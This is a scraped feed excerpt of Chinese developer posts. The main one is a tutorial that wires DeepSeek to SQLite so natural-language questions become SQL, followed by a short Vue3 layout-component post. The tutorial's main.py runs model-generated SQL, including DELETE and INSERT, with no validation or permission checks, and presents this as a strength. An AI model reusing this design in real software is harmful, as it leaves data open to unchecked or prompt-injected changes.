#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-lakeside-light">.hljs-comment,.hljs-quote{color:#5a7b8c}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d22d72}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#935c25}.hljs-bullet,.hljs-string,.hljs-symbol{color:#568c3b}.hljs-section,.hljs-title{color:#257fad}.hljs-keyword,.hljs-selector-tag{color:#6b6bb8}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#ebf8ff;color:#516d7b}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">写在前面</h2>
<p><strong>AI First 时代：用自然语言操作数据库，让非技术人员也能“写”SQL</strong></p>
<p>“未来，开发能力将不再局限于程序员。”——在大语言模型（LLM）的赋能下，这一设想正加速落地。</p>
<p>最近，我在一个探索性项目中尝试将<strong>自然语言转 SQL</strong> 的功能嵌入到日常数据操作流程中。通过集成 DeepSeek 等开源大模型，并搭配轻量级的 SQLite 数据库，我快速构建了一个简洁但富有潜力的 <strong>“AI 驱动型后台管理原型”</strong> 。今天就来聊聊这个思路及其初步实现。</p>
<p>📌 <strong>范式演进：从 “Mobile First” 到 “AI First”</strong><br/>
回顾技术发展，我们经历了从 PC 优先到移动优先的转变；如今，随着大模型能力的成熟，“AI First” 正逐渐成为新一代应用设计的主流思维。</p>
<blockquote>
<p>“以 AI 为核心，结合自然语言生成 SQL 的能力（如 Gemini、DeepSeek 等），将其深度整合进业务系统，让内容编辑、运营人员甚至普通用户都能自主完成数据查询与管理。”</p>
</blockquote>
<p>这带来的变革是：<strong>不再依赖专业数据库知识或后端支持</strong>。用户只需用口语化表达需求——例如“显示上季度活跃用户最多的三个地区”——系统即可自动解析语义、生成合规的 SQL 语句，并返回所需结果。数据访问的门槛，正在被 AI 彻底打破。</p>
<h2 data-id="heading-1">让 LLM 看懂你的数据库：Schema 的正确打开方式</h2>
<p>在 Text-to-SQL 系统中，给大模型提供表结构（Schema）的方式，直接决定了生成 SQL 的准确性。很多人习惯手写一段自然语言描述，比如：</p>
<blockquote>
<p>“employees 表有 id、name、department 和 salary 字段……”</p>
</blockquote>
<p>但这种方式既冗余又容易与实际表结构不一致。</p>
<p>我们来看一种更工程化的做法：</p>
<pre><code class="hljs language-Python" lang="Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_schema_str</span>(<span class="hljs-params">cursor</span>):
    schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
    <span class="hljs-keyword">return</span> <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"<span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
</code></pre>
<p>这里利用了 SQLite 内置的 <code>PRAGMA table_info</code> 命令，<strong>动态获取真实表结构</strong>，并拼接成标准的 <code>CREATE TABLE</code> 语句。这不仅是语法上的“规范输出”，更是对 LLM 训练数据分布的精准对齐——LLM 在预训练阶段见过海量 <code>CREATE TABLE</code> 语句，远比自定义描述更熟悉。</p>
<p>同时，配合 <code>init_db()</code> 中的 <code>CREATE TABLE IF NOT EXISTS</code> 与 <code>INSERT OR IGNORE</code>，整个初始化流程具备<strong>幂等性</strong>，支持反复运行而不污染数据。这种细节，正是从“能跑”到“可靠”的关键分水岭。</p>
<blockquote>
<p><strong>经验之谈</strong>：不要让 LLM 猜你的 Schema，要让它“看”到和数据库一模一样的定义。</p>
</blockquote>
<p>db.py完整代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-keyword">def</span> <span class="hljs-title function_">init_db</span>():
    conn = sqlite3.connect(<span class="hljs-string">"text.db"</span>)
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">"""
        CREATE TABLE IF NOT EXISTS employees(
            id INTEGER PRIMARY KEY,
            name TEXT,
            department TEXT,
            salary INTEGER
        )
    """</span>)
    sample_data = [
        (<span class="hljs-number">6</span>, <span class="hljs-string">"黄佳"</span>, <span class="hljs-string">"销售"</span>, <span class="hljs-number">50000</span>),
        (<span class="hljs-number">7</span>, <span class="hljs-string">"宁宁"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">75000</span>),
        (<span class="hljs-number">8</span>, <span class="hljs-string">"谦谦"</span>, <span class="hljs-string">"销售"</span>, <span class="hljs-number">60000</span>),
        (<span class="hljs-number">9</span>, <span class="hljs-string">"悦悦"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">80000</span>),
        (<span class="hljs-number">10</span>, <span class="hljs-string">"黄仁勋"</span>, <span class="hljs-string">"市场"</span>, <span class="hljs-number">55000</span>),
        (<span class="hljs-number">11</span>, <span class="hljs-string">"刘苗苗"</span>, <span class="hljs-string">"工程"</span>, <span class="hljs-number">55001</span>)
    ]
    cursor.executemany(<span class="hljs-string">"INSERT OR IGNORE INTO employees VALUES(?,?,?,?)"</span>, sample_data)
    conn.commit()
    <span class="hljs-keyword">return</span> conn, cursor

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_schema_str</span>(<span class="hljs-params">cursor</span>):
    schema = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
    <span class="hljs-keyword">return</span> <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([<span class="hljs-string">f"<span class="hljs-subst">{col[<span class="hljs-number">1</span>]}</span> <span class="hljs-subst">{col[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> schema]) + <span class="hljs-string">"\n)"</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e273876e74864a85bc8905737d3abbd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507093&amp;x-signature=K5OsGUF7rbNIKtmxM3VuaptseZ0%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">可靠的 SQL 不来自创意，而来自约束</h2>
<p>在 Text-to-SQL 系统中，调用大模型的代码往往只占几行，但其背后的 Prompt 设计却决定了整个系统的上限。来看一个典型实现：</p>
<p>llm.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

client = OpenAI(
    api_key=<span class="hljs-string">'your_api_key'</span>,
    base_url=<span class="hljs-string">'https://api.deepseek.com/v1'</span>
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">ask_deepseek</span>(<span class="hljs-params">query, schema</span>):
    prompt = <span class="hljs-string">f"""
    这是一个数据库的Schema：
    <span class="hljs-subst">{schema}</span>
    根据这个Schema，请输出一个SQL查询来回答以下问题。
    只输出SQL查询语句本身，不要使用任何 Markdowm 格式
    不要包含反引号、代码块标记或额外说明
    问题：<span class="hljs-subst">{query}</span>
    """</span>
    response = client.chat.completions.create(
        model=<span class="hljs-string">"deepseek-chat"</span>,
        max_tokens=<span class="hljs-number">2048</span>,
        messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}],
        temperature=<span class="hljs-number">0</span>
    )
    <span class="hljs-keyword">return</span> response.choices[<span class="hljs-number">0</span>].message.content.strip()
</code></pre>
<p>这段代码看似简单，实则体现了三个关键工程原则：</p>
<ol>
<li><strong>上下文精准注入</strong>：将动态生成的 <code>CREATE TABLE</code> Schema 直接嵌入 Prompt，确保 LLM 基于真实结构推理；</li>
<li><strong>输出强约束</strong>：明确要求“只输出 SQL”，并禁止 Markdown、反引号等常见干扰项——这是后续直接执行 SQL 的前提；</li>
<li><strong>确定性控制</strong>：<code>temperature=0</code> 关闭随机性，保证相同输入始终返回相同 SQL，提升系统可预测性。</li>
</ol>
<blockquote>
<p>💡 很多开发者抱怨“LLM 生成的 SQL 不能直接用”，其实问题不在模型，而在 Prompt 没有<strong>强制规范输出格式</strong>。在这里，我们不是在“请求帮助”，而是在“下达指令”。</p>
</blockquote>
<p>这种克制而精确的交互方式，正是 LLM 从玩具走向生产的关键一步。</p>
<hr/>
<h2 data-id="heading-3">🔗 让 LLM 成为你的“自然语言数据库接口</h2>
<p>有了可靠的 Schema 上下文和精准的 Prompt 约束，LLM 就不再是“聊天机器人”，而是一个<strong>可编程的自然语言 SQL 引擎</strong>。主流程代码清晰展示了这一思想的落地：</p>
<p>main.py</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">from</span> db <span class="hljs-keyword">import</span> init_db, get_schema_str
<span class="hljs-keyword">from</span> llm <span class="hljs-keyword">import</span> ask_deepseek

conn, cursor = init_db()
schema_str = get_schema_str(cursor)

<span class="hljs-comment"># 1. 查询</span>
question = <span class="hljs-string">"工程部门员工的姓名和工资是多少?"</span>
sql_query = ask_deepseek(question, schema_str)
<span class="hljs-built_in">print</span>(sql_query)
results = cursor.execute(sql_query).fetchall()
<span class="hljs-built_in">print</span>(results)

<span class="hljs-comment"># 2. 插入</span>
question = <span class="hljs-string">"在销售部门增加一个新员工，姓名为张三，工资为45000"</span>
sql_query = ask_deepseek(question, schema_str)
<span class="hljs-built_in">print</span>(sql_query)
cursor.execute(sql_query)
conn.commit()

<span class="hljs-comment"># 3. 删除</span>
question = <span class="hljs-string">"删除市场部门的黄仁勋"</span>
sql_query = ask_deepseek(question, schema_str)
<span class="hljs-built_in">print</span>(sql_query)
cursor.execute(sql_query)
conn.commit()

<span class="hljs-comment"># 4. 查询所有</span>
question = <span class="hljs-string">"查询所有员工的信息"</span>
sql_query = ask_deepseek(question, schema_str)
<span class="hljs-built_in">print</span>(sql_query)
results = cursor.execute(sql_query).fetchall()
<span class="hljs-built_in">print</span>(results)

conn.close()
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3aaf78ff5d8d4fcc8b95416a04325ea3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507093&amp;x-signature=BHXZ5kZwfhHZ135XVBRcww%2B9QeY%3D" alt="image.png" loading="lazy"/>
整个过程没有中间解析、没有后处理、没有格式转换——<strong>LLM 的输出即系统输入</strong>。这种端到端的集成，依赖两个前提：</p>
<ol>
<li><strong>Schema 动态同步</strong>（来自 <code>get_schema_str</code>），确保 LLM “所见即库中所有”；</li>
<li><strong>Prompt 强约束</strong>（来自 <code>ask_deepseek</code>），确保输出是干净、合法的 SQLite 语句。</li>
</ol>
<p>更值得注意的是，这套流程不仅支持 <code>SELECT</code>，还能处理 <code>INSERT</code>、<code>DELETE</code> 等写操作——这意味着用户可以用自然语言完成<strong>完整的 CRUD 操作</strong>，而开发者只需维护一张表结构。</p>
<blockquote>
<p>💡 这不是“AI 写 SQL”，而是<strong>用自然语言驱动数据库的新交互范式</strong>。<br/>
而实现它的全部秘密，就藏在这十几行看似平凡的 glue code 中。</p>
</blockquote>
<p><em>无需人工干预，从自然语言到数据库结果的完整链路如下：</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79bc4f5a268547a3b0a65d4cd8332e92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507093&amp;x-signature=O6b5pktkNkPhBe4GknKz%2BAXlFoE%3D" alt="image.png" loading="lazy"/></p>
<p>这个原型足够轻量，非常适合作为你自己实验的起点。如有其他需求，也可在此基础上灵活扩展。</p>
<blockquote>
<p>项目结构如下。你可以直接复制上文代码，运行 <code>main.py</code>，即可在控制台看到完整的输出结果。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cdc2df007e14cb2b0cfdb00f067b01c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507093&amp;x-signature=pnVzMtqvfjHmZUGIOg995UDeCWU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">🎯 自然语言，正在成为新一代数据库的“入口”</h2>
<p>通过一个不到百行的原型，我们验证了一个关键趋势：<strong>大语言模型 + 精准上下文 + 强约束输出 = 可执行的自然语言数据接口</strong>。</p>
<p>这不仅仅是“让 AI 写 SQL”，而是一次交互范式的迁移——<br/>
从“人适应数据库”（学语法、写查询、调接口），<br/>
转向“数据库适应人”（说需求、得结果、零编码）。</p>
<p>当然，当前方案仍是一个最小可行原型：它没有权限控制、不支持复杂 JOIN、也未处理模糊语义。但它的价值在于证明了：<strong>在特定领域内，LLM 已具备替代传统 CRUD 后端的能力</strong>。</p>
<p>未来，随着模型对 Schema 理解更深、执行更安全、反馈更智能，我们或许不再需要为简单数据操作开发 API。运营人员一句“把上月离职的销售员工标红”，系统就能自动完成查询、更新甚至前端渲染。</p>
<p>而这，正是 <strong>AI First 时代最真实的模样</strong>：<br/>
不是炫技，而是让技术消失在体验之中。</p>
<blockquote>
<p><strong>代码已开源，思路可复用。你，准备好构建自己的自然语言后台了吗？</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[封装通用可视化大屏布局组件：Vue3打造高复用性的 ChartFlex/ChartFlexItem]]></title>    <link>https://juejin.cn/post/7579846221168082998</link>    <guid>https://juejin.cn/post/7579846221168082998</guid>    <pubDate>2025-12-05T02:42:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846221168082998" data-draft-id="7579846685071376438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="封装通用可视化大屏布局组件：Vue3打造高复用性的 ChartFlex/ChartFlexItem"/> <meta itemprop="keywords" content="Vue.js,前端"/> <meta itemprop="datePublished" content="2025-12-05T02:42:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="VOLUN"/> <meta itemprop="url" content="https://juejin.cn/user/3368559359822568"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            封装通用可视化大屏布局组件：Vue3打造高复用性的 ChartFlex/ChartFlexItem
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559359822568/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    VOLUN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:42:01.000Z" title="Fri Dec 05 2025 02:42:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Vue3 项目开发中，尤其是数据可视化场景下，我们经常需要频繁使用 Flex 布局来实现图表的灵活排版。每次重复写<code>display: flex</code>、<code>justify-content</code>、<code>align-items</code>等样式不仅低效，还容易导致样式不统一。本文将分享如何封装一对高复用、强类型的 Flex 布局组件 ——<code>ChartFlex</code>（容器）和<code>ChartFlexItem</code>（子项），让图表布局开发更高效、更规范。</p>
<h2 data-id="heading-0">ChartFlex.vue</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ff5f46599cd4934bd7e692c7ebdece5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=9CtCsWeeXgNsGPy7%2BE3xiqfz8t0%3D" alt="flex.png" loading="lazy"/></p>
<h2 data-id="heading-1">ChartFlexItem.vue</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/796a7e78f462472dbe71a650b3bcfe8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=ndPZksztcGUQpRi0czVEbCYGWcw%3D" alt="flex-item.png" loading="lazy"/></p>
<p>通过上面两个组件结合使用，我们就能很快完成大屏的布局开发，且灵活性高</p>
<h2 data-id="heading-2">示例1</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af8c8f8ae2d04bf7baaebdc4380379e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=5PDRru9BQXdUphM4kHPmhLDtr5Y%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b48bfd88ebb244868270ca0f31ba6e0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=iP4IedGcRq1Vpiwww61hGMUgZjs%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">示例2</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/966f768e0e954a91aa9e1ecfca94053c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=2WpTtdAlgapshWetEI3KiogNHng%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1617ad83112b486687a3bba54b8229b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=6XcUSOayUV%2F%2FKDr21Y2ngkzlm40%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">示例3</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57def9a443314c43a0dd08604aec2f33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=b0FAxghse2314VosyoGwd2Wkk24%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6abd7174b1bb413da94a1d8c8fedd31a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=CdPGccB8gksFeLF8%2BHxrCkOZqJY%3D" alt="image.png" loading="lazy"/></p>
<p>通过上面示例可以看到，我们在不写css的情况下，也能快速完成大屏的布局开发，同时保证了每个图表卡片之间的统一间距，页面的工整性</p>
<h2 data-id="heading-5">动态图演示效果</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91eee06642334636b1527e5c85ef2d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVk9MVU4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507321&amp;x-signature=LjOssOIc9KEHN9UXWy8LKNsrtx8%3D" alt="20251205103453_rec_.gif" loading="lazy"/></p>
<h2 data-id="heading-6">总结</h2>
<p>通过封装<code>ChartFlex</code>和<code>ChartFlexItem</code>，我们将重复的 Flex 布局逻辑抽离成通用组件，带来了以下收益：</p>
<ul>
<li><strong>提升开发效率</strong>：无需重复编写 Flex 样式，通过 Props 快速配置；</li>
<li><strong>样式统一</strong>：避免团队成员手写样式导致的布局不一致；</li>
<li><strong>强类型保障</strong>：TypeScript 约束减少布局相关的 bug；</li>
<li><strong>图表友好</strong>：内置图表场景所需的尺寸控制、溢出处理等逻辑；</li>
<li><strong>高扩展性</strong>：可根据业务需求灵活扩展响应式、加载态等功能。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[永远不要欺骗 React：详解 useEffect 依赖规则与“闭包陷阱”]]></title>    <link>https://juejin.cn/post/7579961957195563058</link>    <guid>https://juejin.cn/post/7579961957195563058</guid>    <pubDate>2025-12-05T02:50:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957195563058" data-draft-id="7579961957195530290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="永远不要欺骗 React：详解 useEffect 依赖规则与“闭包陷阱”"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2025-12-05T02:50:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" 